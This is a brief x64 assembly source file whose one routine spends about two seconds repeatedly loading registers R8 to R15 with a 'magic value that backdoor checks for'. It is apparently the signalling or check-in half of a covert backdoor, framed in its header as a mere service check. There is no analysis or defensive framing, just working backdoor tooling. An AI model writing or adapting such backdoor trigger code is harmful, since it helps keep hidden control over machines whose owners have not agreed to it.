;
; This code Only works for 64Bit CPUs.
; The only purpose of this program is to check if the service is running in background successfully ...
;

PUBLIC set_magic_val

.DATA

; Magic values that backdoor checks for. (0x616D6920616D696E)
MAGIC_VAL QWORD 7020382981934901614

.CODE

set_magic_val PROC

	xor 	rcx, rcx

main_loop:
	; 2 second delay loop (1 loop iteration is 1ns)
	cmp 	rcx, 2000000000
	jge 	end_loop

	; fill R8 - R15 values with MAGIC VALUE 
	mov 	r8, MAGIC_VAL
	mov 	r9, MAGIC_VAL
	mov 	r10, MAGIC_VAL
	mov 	r11, MAGIC_VAL
	mov 	r12, MAGIC_VAL
	mov 	r13, MAGIC_VAL
	mov 	r14, MAGIC_VAL
	mov 	r15, MAGIC_VAL

	add 	rcx, 1
	jmp		main_loop

end_loop:
    ret

set_magic_val ENDP

END
